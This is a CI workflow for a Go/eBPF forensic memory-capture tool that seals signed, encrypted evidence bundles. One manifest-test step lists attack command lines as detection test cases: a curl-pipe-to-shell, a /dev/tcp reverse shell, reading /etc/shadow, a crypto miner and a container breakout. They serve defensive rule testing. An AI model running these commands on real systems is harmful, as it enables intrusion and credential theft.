name: build

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

env:
  GO_VERSION: "1.25"

jobs:
  # ---------------------------------------------------------------------------
  # Static analysis and unit tests
  # ---------------------------------------------------------------------------
  test:
    name: test (unit)
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-go@v7
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true

      - name: Verify formatting
        run: |
          unformatted=$(gofmt -l ./cmd ./pkg ./test)
          if [ -n "$unformatted" ]; then
            echo "these files are not gofmt-clean:"
            echo "$unformatted"
            exit 1
          fi

      - name: Verify the module graph is tidy
        run: |
          go mod tidy
          git diff --exit-code go.mod go.sum

      - name: go vet (amd64 and arm64)
        run: |
          go vet ./...
          GOOS=linux GOARCH=arm64 go vet ./...

      - name: Unit tests with the race detector
        run: go test -race -count=1 -coverprofile=coverage.out -covermode=atomic ./pkg/...

      - name: Coverage summary
        run: go tool cover -func=coverage.out | tail -20

      - uses: actions/upload-artifact@v7
        with:
          name: coverage
          path: coverage.out

  # ---------------------------------------------------------------------------
  # The /proc/[pid]/maps parser takes attacker-influenced input, so it gets a
  # fuzzing pass on every change rather than only in a nightly job.
  # ---------------------------------------------------------------------------
  fuzz:
    name: fuzz (procmaps parser)
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@v7
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true
      - name: Fuzz the maps parser
        run: go test -run=XXX -fuzz=FuzzParseProcMaps -fuzztime=60s ./pkg/capture/
      - name: Upload any crashers
        if: failure()
        uses: actions/upload-artifact@v7
        with:
          name: fuzz-crashers
          path: pkg/capture/testdata/fuzz/

  # ---------------------------------------------------------------------------
  # Lint
  # ---------------------------------------------------------------------------
  lint:
    name: lint
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@v7
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true
      # v8 of the action is required for the v2 configuration schema in
      # .golangci.yml; v6 resolves to golangci-lint 1.x, which cannot read it.
      - uses: golangci/golangci-lint-action@v9
        with:
          version: latest
          args: --timeout=5m

  # ---------------------------------------------------------------------------
  # eBPF: the committed object must reproduce from the committed C source.
  # ---------------------------------------------------------------------------
  ebpf:
    name: ebpf (compile + regenerate)
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-go@v7
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true

      - name: Install the eBPF toolchain
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends clang llvm libbpf-dev
          clang --version

      - name: Compile the eBPF object
        run: |
          clang -target bpf -O2 -g -Wall -Werror -D__TARGET_ARCH_x86 \
            -I bpf -I bpf/include -c bpf/recorder.c -o /tmp/recorder.o
          file /tmp/recorder.o
          llvm-objdump -h /tmp/recorder.o | head -30

      - name: Regenerate the Go bindings
        run: |
          BPF_CLANG=clang \
          BPF_CFLAGS="-O2 -g -Wall -Werror -D__TARGET_ARCH_x86" \
          go generate ./pkg/probe/...

      - name: The regenerated bindings must still compile and pass their tests
        run: |
          go build ./...
          go test -count=1 ./pkg/probe/...

      - name: Verify the vendored vmlinux.h is a real BTF dump
        run: |
          test -s bpf/vmlinux.h
          size=$(wc -c < bpf/vmlinux.h)
          echo "vmlinux.h is $size bytes"
          if [ "$size" -lt 1000000 ]; then
            echo "error: vmlinux.h looks truncated (expected > 1 MB)"
            exit 1
          fi
          grep -q "struct task_struct" bpf/vmlinux.h
          grep -q "struct trace_event_raw_sys_enter" bpf/vmlinux.h

  # ---------------------------------------------------------------------------
  # Multi-architecture build
  # ---------------------------------------------------------------------------
  build:
    name: build (${{ matrix.arch }})
    runs-on: ubuntu-24.04
    needs: [test]
    strategy:
      fail-fast: false
      matrix:
        arch: [amd64, arm64]
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0

      - uses: actions/setup-go@v7
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true

      - name: Install the eBPF toolchain
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends clang llvm libbpf-dev

      - name: Generate eBPF bindings
        run: |
          BPF_CLANG=clang \
          BPF_CFLAGS="-O2 -g -Wall -Werror -D__TARGET_ARCH_x86" \
          go generate ./pkg/probe/...

      - name: Build
        env:
          GOOS: linux
          GOARCH: ${{ matrix.arch }}
          CGO_ENABLED: "0"
        run: |
          VERSION=$(git describe --tags --always --dirty 2>/dev/null || echo "0.1.0-dev")
          COMMIT=$(git rev-parse --short HEAD)
          BUILD_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
          MODULE=github.com/Unspekable1654/flight-recorder
          go build -trimpath -ldflags "-s -w \
            -X ${MODULE}/pkg/version.Version=${VERSION} \
            -X ${MODULE}/pkg/version.Commit=${COMMIT} \
            -X ${MODULE}/pkg/version.BuildDate=${BUILD_DATE}" \
            -o flight-recorder-linux-${{ matrix.arch }} ./cmd/flight-recorder
          ls -la flight-recorder-linux-${{ matrix.arch }}

      - name: Smoke test the native binary
        if: matrix.arch == 'amd64'
        run: |
          ./flight-recorder-linux-amd64 version
          ./flight-recorder-linux-amd64 rules default | head -20
          ./flight-recorder-linux-amd64 rules test --cmdline "/usr/bin/cat /etc/shadow"
          # The full evidence pipeline, with no kernel and no privileges.
          ./flight-recorder-linux-amd64 demo --output "${RUNNER_TEMP}/demo"
          # The committed sample must verify with the public key alone.
          ./flight-recorder-linux-amd64 verify --bundle examples/demo-bundle --key examples/demo-pub.pem

      - uses: actions/upload-artifact@v7
        with:
          name: flight-recorder-linux-${{ matrix.arch }}
          path: flight-recorder-linux-${{ matrix.arch }}
          retention-days: 14

  # ---------------------------------------------------------------------------
  # The evidence pipeline is pure userspace: it must build and run correctly on
  # macOS and Windows, where there is no kernel to attach to. The published
  # .exe and macOS binaries rest on this job.
  # ---------------------------------------------------------------------------
  cross:
    name: cross-platform (${{ matrix.os }})
    runs-on: ${{ matrix.os }}
    needs: [test]
    strategy:
      fail-fast: false
      matrix:
        os: [windows-latest, macos-latest]
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-go@v7
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true

      - name: Unit tests
        shell: bash
        run: go test -count=1 ./pkg/...

      - name: Build and exercise the full evidence pipeline
        shell: bash
        run: |
          BIN="./flight-recorder"
          if [ "$RUNNER_OS" = "Windows" ]; then BIN="./flight-recorder.exe"; fi
          go build -o "$BIN" ./cmd/flight-recorder

          "$BIN" version
          "$BIN" rules test --cmdline "/usr/bin/cat /etc/shadow"

          # Seal, sign, render CASE/UCO, compress, encrypt, verify, then prove
          # that tampering is detected -- with no kernel and no privileges.
          "$BIN" demo --output "${RUNNER_TEMP}/demo"

          # --keep must leave a bundle that actually verifies. It previously
          # ran the destructive tamper step regardless and only suppressed the
          # warning that the bundle had been corrupted.
          "$BIN" demo --keep --output "${RUNNER_TEMP}/keep"
          BUNDLE=$(ls -d "${RUNNER_TEMP}"/keep/evidence/*/ | head -1)
          "$BIN" verify --bundle "$BUNDLE" --key "${RUNNER_TEMP}/keep/demo-key.pem"

          # The committed sample must verify with the public key alone. That is
          # the position of a third-party examiner who was never given the
          # decryption key, and it has to exit 0.
          "$BIN" verify --bundle examples/demo-bundle --key examples/demo-pub.pem
          "$BIN" inspect --bundle examples/demo-bundle

  # ---------------------------------------------------------------------------
  # examples/ deliberately commits an evidence bundle and a public key. No
  # private key material may ever join it.
  # ---------------------------------------------------------------------------
  no-secrets:
    name: no committed key material
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7

      - name: Fail on any committed private key
        run: |
          if git grep -lE -- "-----BEGIN [A-Z ]*PRIVATE KEY-----" -- . ; then
            echo "::error::private key material is committed to this repository"
            exit 1
          fi
          echo "no private key material in the tree"

      - name: The shipped sample key must be a public key
        run: |
          head -1 examples/demo-pub.pem | grep -q "BEGIN PUBLIC KEY"
          ! grep -q "PRIVATE" examples/demo-pub.pem
          echo "examples/demo-pub.pem is a public key"

      - name: The sample bundle must be the documented set of files
        run: |
          for f in manifest.json metadata.jsonld receipt.json regions.json \
                   dump.bin.sha256 dump.bin.zst.enc; do
            test -s "examples/demo-bundle/$f" || { echo "missing $f"; exit 1; }
          done
          # The payload must be encrypted, never a raw dump.
          head -c 4 examples/demo-bundle/dump.bin.zst.enc | xxd | head -1

  # ---------------------------------------------------------------------------
  # Integration: real kernel, real eBPF, real process_vm_readv.
  # ---------------------------------------------------------------------------
  integration:
    name: integration (privileged)
    runs-on: ubuntu-24.04
    needs: [test]
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-go@v7
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true

      - name: Install the eBPF toolchain
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends clang llvm libbpf-dev

      - name: Kernel preflight
        id: preflight
        run: |
          uname -r
          if [ -r /sys/kernel/btf/vmlinux ]; then
            echo "btf=yes" >> "$GITHUB_OUTPUT"
            ls -la /sys/kernel/btf/vmlinux
          else
            echo "btf=no" >> "$GITHUB_OUTPUT"
            echo "::warning::this runner kernel exposes no BTF; CO-RE probes cannot load and integration tests will be skipped"
          fi

      - name: Generate eBPF bindings
        run: |
          BPF_CLANG=clang \
          BPF_CFLAGS="-O2 -g -Wall -Werror -D__TARGET_ARCH_x86" \
          go generate ./pkg/probe/...

      - name: Integration tests
        if: steps.preflight.outputs.btf == 'yes'
        run: |
          go build -o /tmp/fr ./cmd/flight-recorder
          sudo -E env "PATH=$PATH" go test -tags=integration -v -timeout 15m ./test/integration/...

      - name: Live capture against a real process
        if: steps.preflight.outputs.btf == 'yes'
        run: |
          # Hold a known secret in a live process, capture it, and prove the
          # secret is recoverable from the sealed bundle.
          sudo -E env "PATH=$PATH" /tmp/fr keygen --key "${RUNNER_TEMP}/key.pem" --pub "${RUNNER_TEMP}/pub.pem"

          /bin/sh -c 'SECRET=CI_LIVE_CAPTURE_MARKER; export SECRET; sleep 60' &
          TARGET=$!
          sleep 1

          sudo -E env "PATH=$PATH" /tmp/fr capture \
            --pid "$TARGET" \
            --output "${RUNNER_TEMP}/evidence" \
            --key "${RUNNER_TEMP}/key.pem"

          CASE=$(sudo ls "${RUNNER_TEMP}/evidence" | head -1)
          echo "captured case $CASE"

          sudo -E env "PATH=$PATH" /tmp/fr verify \
            --bundle "${RUNNER_TEMP}/evidence/${CASE}" \
            --key "${RUNNER_TEMP}/key.pem"

          sudo -E env "PATH=$PATH" /tmp/fr inspect \
            --bundle "${RUNNER_TEMP}/evidence/${CASE}"

          # Decrypt and confirm the marker survived acquisition and sealing.
          sudo -E env "PATH=$PATH" /tmp/fr decrypt \
            --bundle "${RUNNER_TEMP}/evidence/${CASE}" \
            --key "${RUNNER_TEMP}/key.pem" \
            --out "${RUNNER_TEMP}/dump.bin"
          sudo grep -q "CI_LIVE_CAPTURE_MARKER" "${RUNNER_TEMP}/dump.bin"
          echo "the marker was recovered from the sealed evidence"

          kill "$TARGET" || true

  # ---------------------------------------------------------------------------
  # Deployment manifests
  # ---------------------------------------------------------------------------
  manifests:
    name: manifests
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-go@v7
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true

      - name: Validate the shipped trigger ruleset
        run: |
          go run ./cmd/flight-recorder rules default > /tmp/default-triggers.yaml
          go run ./cmd/flight-recorder rules validate --config /tmp/default-triggers.yaml
          # The ConfigMap's embedded ruleset must also be valid.
          python3 - <<'PY'
          import yaml, sys
          doc = yaml.safe_load(open('deploy/k8s/configmap.yaml'))
          open('/tmp/configmap-triggers.yaml', 'w').write(doc['data']['triggers.yaml'])
          PY
          go run ./cmd/flight-recorder rules validate --config /tmp/configmap-triggers.yaml

      - name: Every default rule must match its scenario
        run: |
          set -e
          check() { go run ./cmd/flight-recorder rules test --cmdline "$1" | grep -q "matched rule:  $2" || { echo "FAIL: $1 did not match $2"; exit 1; }; }
          check "/usr/bin/cat /etc/shadow" shadow_access
          check "/bin/sh -c curl -s http://198.51.100.9/p.sh | sh" curl_pipe_sh
          check "/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1" reverse_shell
          check "/tmp/.x/xmrig -o stratum+tcp://pool.example:4444" crypto_miner
          check "/usr/bin/nsenter --target 1 --mount /bin/sh" container_breakout
          echo "every shipped rule matches its scenario"

      - name: Validate Kubernetes manifests
        run: |
          curl -sSLo /tmp/kubeconform.tar.gz \
            https://github.com/yannh/kubeconform/releases/download/v0.6.7/kubeconform-linux-amd64.tar.gz
          tar xzf /tmp/kubeconform.tar.gz -C /tmp
          /tmp/kubeconform -strict -summary -ignore-missing-schemas deploy/k8s/ test/scenarios/

      - name: Lint and render the Helm chart
        run: |
          curl -sSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
          helm lint deploy/helm/flight-recorder
          helm template flight-recorder deploy/helm/flight-recorder --namespace flight-recorder > /tmp/rendered.yaml
          /tmp/kubeconform -strict -summary -ignore-missing-schemas /tmp/rendered.yaml
          # The rendered DaemonSet must keep the properties the tool depends on.
          grep -q "hostPID: true" /tmp/rendered.yaml
          grep -q "SYS_PTRACE" /tmp/rendered.yaml
          grep -q "readOnlyRootFilesystem: true" /tmp/rendered.yaml
          grep -q 'privileged: false' /tmp/rendered.yaml

  # ---------------------------------------------------------------------------
  # Container image (built on every change, pushed only on release)
  # ---------------------------------------------------------------------------
  image:
    name: container image
    runs-on: ubuntu-24.04
    needs: [test]
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v3
      - name: Build
        uses: docker/build-push-action@v6
        with:
          context: .
          push: false
          load: true
          tags: flight-recorder:ci
          build-args: |
            VERSION=ci
            COMMIT=${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
      - name: The image must be able to start
        run: |
          docker run --rm flight-recorder:ci version
          docker run --rm flight-recorder:ci rules default | head -5
